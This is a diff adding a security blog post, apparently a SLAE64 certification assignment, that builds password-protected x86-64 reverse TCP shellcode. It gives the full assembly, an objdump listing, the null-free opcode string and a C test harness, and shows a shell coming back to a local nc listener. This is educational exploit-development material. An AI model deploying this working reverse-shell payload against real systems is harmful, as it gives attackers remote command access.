@@ -1,0 +1,749 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>SLAE64 Assignment 2 - TCP Reverse Shellcode | nibbles</title>
+<meta name="keywords" content="slae64">
+<meta name="description" content="This post introduces my 2nd mission to my SLAE64 journey.
+Introduction The main goal for the first SLAE64 assignment is to develop a reverse TCP shellcode with the following requirements:
+Reverse shell connects to the configured IP and port; User needs to provide a correct password Executing a shell on incoming connection if password is correct; The shellcode should be null-free; Creating a TCP Reverse Shellcode There is a lof of overlap information with my post regarding the SLAE32 TCP Reverse Shellcode.">
+<meta name="author" content="nibbles">
+<link rel="canonical" href="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_2/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.bccfefac377bc340f06c260aed1bddf49a4354816d7c570d6aac75a997986c95.css" integrity="sha256-vM/vrDd7w0DwbCYK7Rvd9JpDVIFtfFcNaqx1qZeYbJU=" rel="preload stylesheet" as="style">
+<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
+    onload="hljs.initHighlightingOnLoad();"></script>
+<link rel="icon" href="https://0xnibbles.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://0xnibbles.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://0xnibbles.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://0xnibbles.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://0xnibbles.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+    <style>
+        @media (prefers-color-scheme: dark) {
+            :root {
+                --theme: rgb(29, 30, 32);
+                --entry: rgb(46, 46, 51);
+                --primary: rgb(218, 218, 219);
+                --secondary: rgb(155, 156, 157);
+                --tertiary: rgb(65, 66, 68);
+                --content: rgb(196, 196, 197);
+                --hljs-bg: rgb(46, 46, 51);
+                --code-bg: rgb(55, 56, 62);
+                --border: rgb(51, 51, 51);
+            }
+
+            .list {
+                background: var(--theme);
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-track {
+                background: 0 0;
+            }
+
+            .list:not(.dark)::-webkit-scrollbar-thumb {
+                border-color: var(--theme);
+            }
+        }
+
+    </style>
+</noscript><meta property="og:title" content="SLAE64 Assignment 2 - TCP Reverse Shellcode" />
+<meta property="og:description" content="This post introduces my 2nd mission to my SLAE64 journey.
+Introduction The main goal for the first SLAE64 assignment is to develop a reverse TCP shellcode with the following requirements:
+Reverse shell connects to the configured IP and port; User needs to provide a correct password Executing a shell on incoming connection if password is correct; The shellcode should be null-free; Creating a TCP Reverse Shellcode There is a lof of overlap information with my post regarding the SLAE32 TCP Reverse Shellcode." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://0xnibbles.github.io/posts/slae64/slae_64_assignment_2/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2023-01-01T02:30:49+00:00" />
+<meta property="article:modified_time" content="2023-01-01T02:30:49+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="SLAE64 Assignment 2 - TCP Reverse Shellcode"/>
+<meta name="twitter:description" content="This post introduces my 2nd mission to my SLAE64 journey.
+Introduction The main goal for the first SLAE64 assignment is to develop a reverse TCP shellcode with the following requirements:
+Reverse shell connects to the configured IP and port; User needs to provide a correct password Executing a shell on incoming connection if password is correct; The shellcode should be null-free; Creating a TCP Reverse Shellcode There is a lof of overlap information with my post regarding the SLAE32 TCP Reverse Shellcode."/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://0xnibbles.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "SLAE64 Assignment 2 - TCP Reverse Shellcode",
+      "item": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_2/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SLAE64 Assignment 2 - TCP Reverse Shellcode",
+  "name": "SLAE64 Assignment 2 - TCP Reverse Shellcode",
+  "description": "This post introduces my 2nd mission to my SLAE64 journey.\nIntroduction The main goal for the first SLAE64 assignment is to develop a reverse TCP shellcode with the following requirements:\nReverse shell connects to the configured IP and port; User needs to provide a correct password Executing a shell on incoming connection if password is correct; The shellcode should be null-free; Creating a TCP Reverse Shellcode There is a lof of overlap information with my post regarding the SLAE32 TCP Reverse Shellcode.",
+  "keywords": [
+    "slae64"
+  ],
+  "articleBody": " This post introduces my 2nd mission to my SLAE64 journey.\nIntroduction The main goal for the first SLAE64 assignment is to develop a reverse TCP shellcode with the following requirements:\nReverse shell connects to the configured IP and port; User needs to provide a correct password Executing a shell on incoming connection if password is correct; The shellcode should be null-free; Creating a TCP Reverse Shellcode There is a lof of overlap information with my post regarding the SLAE32 TCP Reverse Shellcode. I advice you to take look at if haven’t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.\nFor this assignment I took the TCP Bind Shellcode that was used during the course as a reference. The following is already changed to work with a custom password. The same as assignment 1 - SLAE64 TCP Reverse Shellcode\nThe chosen password is again isolemnlyswearthatiamuptonogood.\nThis a 31 byte size string but our buffer has 32 bytes in size because of the newline byte when we press enter key.\nThis time i’ll directly to the null byte free shellcode. If you want to look for a more detailed analysis, please check the Nulls? Get out of here! section of the previous assignment.\nAdding the ask password part to the final shellcode, becomes as follows:\nglobal _start _start: jmp main ask_pass: db \"Tell me the passcode\", 0xa main: ; sock = socket(AF_INET, SOCK_STREAM, 0) ; AF_INET = 2 ; SOCK_STREAM = 1 ; syscall number 41 xor rsi, rsi mul rsi add rax, 41 push byte 0x2 pop rdi inc rsi ;xor rdx, rdx syscall ; copy socket descriptor to rdi for future use xchg rdi, rax ; server.sin_family = AF_INET ; server.sin_port = htons(PORT) ; server.sin_addr.s_addr = INADDR_ANY ; bzero(\u0026server.sin_zero, 8) xor rax, rax push rax ; pushing 0.0.0.0 into in_addr push word 0x2923 ;little endian -\u003e 9001 = 0x2329 ; byte first ... 0x115C is 4444) push word 0x2 ; AF_INET - which is 0x02 mov rsi, rsp ; moving stack address to rsi ; connect(sock, (struct sockaddr *)\u0026server, sockaddr_len) xor rax, rax mov rdx, rax add rax, 42 mov rsi, rsp add rdx, 16 syscall ; duplicate sockets ; dup2 (new, old) xor rax, rax mov al, 33 xor rsi, rsi syscall mov al, 33 inc rsi syscall mov al, 33 inc rsi syscall ; ############ asking for password ------------------------------ password: ; sys_write ; rax : 1 - write syscall number ; rdi : unsigned int fd : 1 for stdout ; rsi : const char *buf : password buffer ; rdx : size_t count : password size xor rax, rax xor rdx, rdx ; or cqo?? inc rax mov rdi, rax lea rsi, [rel ask_pass] mov dl, 21 syscall ; sys_read ; rdi : unsigned int fd : 0 for stdin ; rsi : char *buf : stack? ; rdx : size_t count : how big xor rdx, rdx xor rax, rax xor rdi, rdi ; rax is already zero mov rsi, rsp add rdx, 32 ;password size syscall mov rdi, rsp xor rsi, rsi push rsi mov rsi, 0x0a646f6f676f6e6f ; \\ndoogono --\u003e \\n - new line byte = 0x0a push rsi mov rsi, 0x7470756d61697461 ; tpumaita push rsi mov rsi, 0x6874726165777379 ; htraewsy push rsi mov rsi, 0x6c6e6d656c6f7369 ; lnmelosi push rsi mov rsi, rsp ; password buffer pointer xor rcx, rcx add rcx, 32 ; 31 bytes for password and 1 byte for newline char repe cmpsb jne password ; ###### ------------------------------------------ ; execve ; First NULL push xor rax, rax push rax ; push /bin//sh in reverse mov rbx, 0x68732f2f6e69622f push rbx ; store /bin//sh address in RDI mov rdi, rsp ; Second NULL push push rax ; set RDX mov rdx, rsp ; Push address of /bin//sh push rdi ; set RSI mov rsi, rsp ; Call the Execve syscall add rax, 59 syscall We can verify the shellcode does not have null bytes as shown below with objdump\nobjdump -M intel -d shell-bind-password shell-bind-password: file format elf64-x86-64 Disassembly of section .text: 0000000000401000 \u003c_start\u003e: 401000:\teb 15 jmp 401017 0000000000401002 : 401002:\t54 push rsp 401003:\t65 6c gs ins BYTE PTR es:[rdi],dx 401005:\t6c ins BYTE PTR es:[rdi],dx 401006:\t20 6d 65 and BYTE PTR [rbp+0x65],ch 401009:\t20 74 68 65 and BYTE PTR [rax+rbp*2+0x65],dh 40100d:\t20 70 61 and BYTE PTR [rax+0x61],dh 401010:\t73 73 jae 401085 401012:\t63 6f 64 movsxd ebp,DWORD PTR [rdi+0x64] 401015:\t65 gs 401016:\t0a .byte 0xa 0000000000401017 : 401017:\t48 31 f6 xor rsi,rsi 40101a:\t48 f7 e6 mul rsi 40101d:\t48 83 c0 29 add rax,0x29 401021:\t6a 02 push 0x2 401023:\t5f pop rdi 401024:\t48 ff c6 inc rsi 401027:\t0f 05 syscall 401029:\t48 97 xchg rdi,rax 40102b:\t48 31 c0 xor rax,rax 40102e:\t50 push rax 40102f:\t66 68 23 29 pushw 0x2923 401033:\t66 6a 02 pushw 0x2 401036:\t48 89 e6 mov rsi,rsp 401039:\t48 83 c2 10 add rdx,0x10 40103d:\t48 83 c0 31 add rax,0x31 401041:\t0f 05 syscall 401043:\t48 31 c0 xor rax,rax 401046:\t48 89 c2 mov rdx,rax 401049:\t48 83 c2 01 add rdx,0x1 40104d:\t48 83 c0 32 add rax,0x32 401051:\t0f 05 syscall 401053:\t48 31 c0 xor rax,rax 401056:\t48 89 c6 mov rsi,rax 401059:\t48 89 c2 mov rdx,rax 40105c:\t48 83 c0 2b add rax,0x2b 401060:\t0f 05 syscall 401062:\t48 97 xchg rdi,rax 401064:\t4d 31 c9 xor r9,r9 0000000000401067 : 401067:\t48 31 c0 xor rax,rax 40106a:\t48 83 c0 21 add rax,0x21 40106e:\t4c 89 ce mov rsi,r9 401071:\t0f 05 syscall 401073:\t49 ff c1 inc r9 401076:\t49 83 f9 03 cmp r9,0x3 40107a:\t75 eb jne 401067 000000000040107c : 40107c:\t48 31 c0 xor rax,rax 40107f:\t48 31 d2 xor rdx,rdx 401082:\t48 ff c0 inc rax 401085:\t48 89 c7 mov rdi,rax 401088:\t48 8d 35 73 ff ff ff lea rsi,[rip+0xffffffffffffff73] # 401002 40108f:\tb2 15 mov dl,0x15 401091:\t0f 05 syscall 401093:\t48 31 d2 xor rdx,rdx 401096:\t48 31 c0 xor rax,rax 401099:\t48 31 ff xor rdi,rdi 40109c:\t48 89 e6 mov rsi,rsp 40109f:\t48 83 c2 20 add rdx,0x20 4010a3:\t0f 05 syscall 4010a5:\t48 89 e7 mov rdi,rsp 4010a8:\t48 31 f6 xor rsi,rsi 4010ab:\t56 push rsi 4010ac:\t48 be 6f 6e 6f 67 6f movabs rsi,0xa646f6f676f6e6f 4010b3:\t6f 64 0a 4010b6:\t56 push rsi 4010b7:\t48 be 61 74 69 61 6d movabs rsi,0x7470756d61697461 4010be:\t75 70 74 4010c1:\t56 push rsi 4010c2:\t48 be 79 73 77 65 61 movabs rsi,0x6874726165777379 4010c9:\t72 74 68 4010cc:\t56 push rsi 4010cd:\t48 be 69 73 6f 6c 65 movabs rsi,0x6c6e6d656c6f7369 4010d4:\t6d 6e 6c 4010d7:\t56 push rsi 4010d8:\t48 89 e6 mov rsi,rsp 4010db:\t48 31 c9 xor rcx,rcx 4010de:\t80 c1 20 add cl,0x20 4010e1:\tf3 a6 repz cmps BYTE PTR ds:[rsi],BYTE PTR es:[rdi] 4010e3:\t75 97 jne 40107c 4010e5:\t48 31 c0 xor rax,rax 4010e8:\t50 push rax 4010e9:\t48 bb 2f 62 69 6e 2f movabs rbx,0x68732f2f6e69622f 4010f0:\t2f 73 68 4010f3:\t53 push rbx 4010f4:\t48 89 e7 mov rdi,rsp 4010f7:\t50 push rax 4010f8:\t48 89 e2 mov rdx,rsp 4010fb:\t57 push rdi 4010fc:\t48 89 e6 mov rsi,rsp 4010ff:\t48 83 c0 3b add rax,0x3b 401103:\t0f 05 syscall From the output we can verify the null bytes were gone effectively.\nCompiling and Testing the Shellcode To be easier to compile my shellcode scripts and get the size and the opcodes I’ll use the 64-bit version of assembler.sh.\nAvailable in https://github.com/0xnibbles/slae_x86_64/blob/main/assembler.sh\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› ╰─$ ../../assembler.sh reverse-shell-password.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 238 \"\\xeb\\x15\\x54\\x65\\x6c\\x6c\\x20\\x6d\\x65\\x20\\x74\\x68\\x65\\x20\\x70\\x61\\x73\\x73\\x63\\x6f\\x64\\x65\\x0a\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x48\\x83\\xc0\\x29\\x6a\\x02\\x5f\\x48\\xff\\xc6\\x0f\\x05\\x48\\x97\\x48\\x31\\xc0\\x50\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x48\\x89\\xe6\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x83\\xc0\\x2a\\x48\\x89\\xe6\\x48\\x83\\xc2\\x10\\x0f\\x05\\x48\\x31\\xc0\\xb0\\x21\\x48\\x31\\xf6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\x8d\\x35\\x8b\\xff\\xff\\xff\\xb2\\x15\\x0f\\x05\\x48\\x31\\xd2\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x89\\xe6\\x48\\x83\\xc2\\x20\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x56\\x48\\xbe\\x6f\\x6e\\x6f\\x67\\x6f\\x6f\\x64\\x0a\\x56\\x48\\xbe\\x61\\x74\\x69\\x61\\x6d\\x75\\x70\\x74\\x56\\x48\\xbe\\x79\\x73\\x77\\x65\\x61\\x72\\x74\\x68\\x56\\x48\\xbe\\x69\\x73\\x6f\\x6c\\x65\\x6d\\x6e\\x6c\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\x48\\x83\\xc1\\x20\\xf3\\xa6\\x75\\x96\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\" -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include #include unsigned char code[] = \\ \"\\xeb\\x15\\x54\\x65\\x6c\\x6c\\x20\\x6d\\x65\\x20\\x74\\x68\\x65\\x20\\x70\\x61\\x73\\x73\\x63\\x6f\\x64\\x65\\x0a\\x48\\x31\\xf6\\x48\\xf7\\xe6\\x48\\x83\\xc0\\x29\\x6a\\x02\\x5f\\x48\\xff\\xc6\\x0f\\x05\\x48\\x97\\x48\\x31\\xc0\\x50\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x48\\x89\\xe6\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x83\\xc0\\x2a\\x48\\x89\\xe6\\x48\\x83\\xc2\\x10\\x0f\\x05\\x48\\x31\\xc0\\xb0\\x21\\x48\\x31\\xf6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\xb0\\x21\\x48\\xff\\xc6\\x0f\\x05\\x48\\x31\\xc0\\x48\\x31\\xd2\\x48\\xff\\xc0\\x48\\x89\\xc7\\x48\\x8d\\x35\\x8b\\xff\\xff\\xff\\xb2\\x15\\x0f\\x05\\x48\\x31\\xd2\\x48\\x31\\xc0\\x48\\x31\\xff\\x48\\x89\\xe6\\x48\\x83\\xc2\\x20\\x0f\\x05\\x48\\x89\\xe7\\x48\\x31\\xf6\\x56\\x48\\xbe\\x6f\\x6e\\x6f\\x67\\x6f\\x6f\\x64\\x0a\\x56\\x48\\xbe\\x61\\x74\\x69\\x61\\x6d\\x75\\x70\\x74\\x56\\x48\\xbe\\x79\\x73\\x77\\x65\\x61\\x72\\x74\\x68\\x56\\x48\\xbe\\x69\\x73\\x6f\\x6c\\x65\\x6d\\x6e\\x6c\\x56\\x48\\x89\\xe6\\x48\\x31\\xc9\\x80\\xc1\\x20\\xf3\\xa6\\x75\\x97\\x48\\x31\\xc0\\x50\\x48\\xbb\\x2f\\x62\\x69\\x6e\\x2f\\x2f\\x73\\x68\\x53\\x48\\x89\\xe7\\x50\\x48\\x89\\xe2\\x57\\x48\\x89\\xe6\\x48\\x83\\xc0\\x3b\\x0f\\x05\"; main() { printf(\"Shellcode Length: %d\\n\", strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› ╰─$ gcc -fno-stack-protector -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86_64/assignments/2-shell-reverse-tcp-password-shellcode ‹main●› ╰─$ ./shellcode Shellcode Length: 237 --------------- ╭─edu@debian ~/Desktop/slae_x86_64/assignments/1-shell-bind-tcp-password-shellcode ‹main●› ╰─$ nc -lvnp 9001 listening on [any] 9001 ... connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 44000 Tell me the passcode hgdajhsd Tell me the passcode isolemnlyswearthatiamuptonogood whoami edu id uid=1000(edu) gid=1000(edu) ... Oh yeah! We get a connection back and the spawn a shell if th epassword is correct!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86_64\n",
+  "wordCount" : "1461",
+  "inLanguage": "en",
+  "datePublished": "2023-01-01T02:30:49Z",
+  "dateModified": "2023-01-01T02:30:49Z",
+  "author":{
+    "@type": "Person",
+    "name": "nibbles"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://0xnibbles.github.io/posts/slae64/slae_64_assignment_2/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "nibbles",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://0xnibbles.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class="" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "dark") {
+        document.body.classList.add('dark');
+    } else if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    } else if (window.matchMedia('(prefers-color-scheme: dark)').matches) {
+        document.body.classList.add('dark');
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://0xnibbles.github.io/" accesskey="h" title="nibbles (Alt + H)">nibbles</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://0xnibbles.github.io/" title="Home">
+                    <span>Home</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/about.html" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/categories/" title="Categories">
+                    <span>Categories</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/projects/" title="Projects">
+                    <span>Projects</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/archives" title="Archive">
+                    <span>Archive</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://0xnibbles.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://0xnibbles.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://0xnibbles.github.io/posts/">Posts</a></div>
+    <h1 class="post-title">
+      SLAE64 Assignment 2 - TCP Reverse Shellcode
+    </h1>
+    <div class="post-meta"><span title='2023-01-01 02:30:49 +0000 UTC'>January 1, 2023</span>&nbsp;·&nbsp;7 min&nbsp;·&nbsp;nibbles
+
+</div>
+  </header> <div class="toc">
+    <details >
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#introduction" aria-label="Introduction">Introduction</a></li>
+                <li>
+                    <a href="#creating-a-tcp-reverse-shellcode" aria-label="Creating a TCP Reverse Shellcode">Creating a TCP Reverse Shellcode</a></li>
+                <li>
+                    <a href="#compiling-and-testing-the-shellcode" aria-label="Compiling and Testing the Shellcode">Compiling and Testing the Shellcode</a>
+                </li>
+            </ul>
+        </div>
+    </details>
+</div>
+
+  <div class="post-content"><p><img loading="lazy" src="/slae64/slae64.png#center" alt="SLAE64"  title="SLAE64"  />
+</p>
+<p>This post introduces my 2nd mission to my SLAE64 journey.</p>
+<h2 id="introduction">Introduction<a hidden class="anchor" aria-hidden="true" href="#introduction">#</a></h2>
+<p>The main goal for the first SLAE64 assignment is to develop a reverse TCP shellcode with the following requirements:</p>
+<ul>
+<li>Reverse shell connects to the configured IP and port;</li>
+<li>User needs to provide a correct password</li>
+<li>Executing a shell on incoming connection if password is correct;</li>
+<li>The shellcode should be <strong>null-free</strong>;</li>
+</ul>
+<h2 id="creating-a-tcp-reverse-shellcode">Creating a TCP Reverse Shellcode<a hidden class="anchor" aria-hidden="true" href="#creating-a-tcp-reverse-shellcode">#</a></h2>
+<p>There is a lof of overlap information with my post regarding the <a href="/posts/slae_32_assignment_2/">SLAE32 TCP Reverse Shellcode</a>. I advice you to take look at if haven&rsquo;t done already. There are some important concepts and ideas to understand what and why the shellcode is doing.</p>
+<p>For this assignment I took the TCP Bind Shellcode that was used during the course as a reference. The following is already changed to work with a custom password. The same as <a href="/posts/slae64/slae_64_assignment_1/#creating-a-tcp-bind-shellcode">assignment 1 - SLAE64 TCP Reverse Shellcode</a></p>
+<p><img loading="lazy" src="/slae64/1/bind_pass.jpg#center" alt="Marauder&amp;rsquo;s Map Password"  title="Marauder&#39;s Map Password"  />
+</p>
+<p>The chosen password is again <code>isolemnlyswearthatiamuptonogood</code>.</p>
+<blockquote>
+<p>This a 31 byte size string but our buffer has 32 bytes in size because of the <code>newline</code> byte when we press <code>enter</code> key.</p>
+</blockquote>
+<p>This time i&rsquo;ll directly to the null byte free shellcode. If you want to look for a more detailed analysis, please check the <a href="/posts/slae64/slae_64_assignment_1/#nulls-get-out-of-here">Nulls? Get out of here!</a> section of the previous assignment.</p>
+<p>Adding the ask password part to the <code>final shellcode</code>, becomes as follows:</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-asm" data-lang="asm"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#a6e22e">global</span> <span style="color:#66d9ef">_start</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>_start:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">jmp</span> <span style="color:#66d9ef">main</span>
+</span></span><span style="display:flex;"><span>        ask_pass: <span style="color:#a6e22e">db</span> <span style="color:#960050;background-color:#1e0010">&#34;</span><span style="color:#66d9ef">Tell</span> <span style="color:#66d9ef">me</span> <span style="color:#66d9ef">the</span> <span style="color:#66d9ef">passcode</span><span style="color:#960050;background-color:#1e0010">&#34;</span>, <span style="color:#ae81ff">0xa</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>main:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; sock = socket(AF_INET, SOCK_STREAM, 0)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; AF_INET = 2
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; SOCK_STREAM = 1
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; syscall number 41 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mul</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">add</span> <span style="color:#66d9ef">rax</span>, <span style="color:#ae81ff">41</span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">byte</span> <span style="color:#ae81ff">0x2</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">pop</span> <span style="color:#66d9ef">rdi</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">inc</span> <span style="color:#66d9ef">rsi</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">;xor rdx, rdx 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#a6e22e">syscall</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; copy socket descriptor to rdi for future use 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xchg</span> <span style="color:#66d9ef">rdi</span>, <span style="color:#66d9ef">rax</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; server.sin_family = AF_INET 
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; server.sin_port = htons(PORT)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; server.sin_addr.s_addr = INADDR_ANY
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	<span style="color:#75715e">; bzero(&amp;server.sin_zero, 8)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">xor</span> <span style="color:#66d9ef">rax</span>, <span style="color:#66d9ef">rax</span> 
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">push</span> <span style="color:#66d9ef">rax</span>                <span style="color:#75715e">; pushing 0.0.0.0 into in_addr
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2923</span>        <span style="color:#75715e">;little endian -&gt; 9001 = 0x2329
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>                                <span style="color:#75715e">; byte first ... 0x115C is 4444)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        <span style="color:#a6e22e">push</span> <span style="color:#66d9ef">word</span> <span style="color:#ae81ff">0x2</span>           <span style="color:#75715e">; AF_INET - which is 0x02
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">mov</span> <span style="color:#66d9ef">rsi</span>, <span style="color:#66d9ef">rsp</span>            <span style="color:#75715e">; moving stack address to rsi
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>	<span style="color:#75715e">; connect(sock, (struct sockaddr *)&amp;server, sockaddr_len)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>	
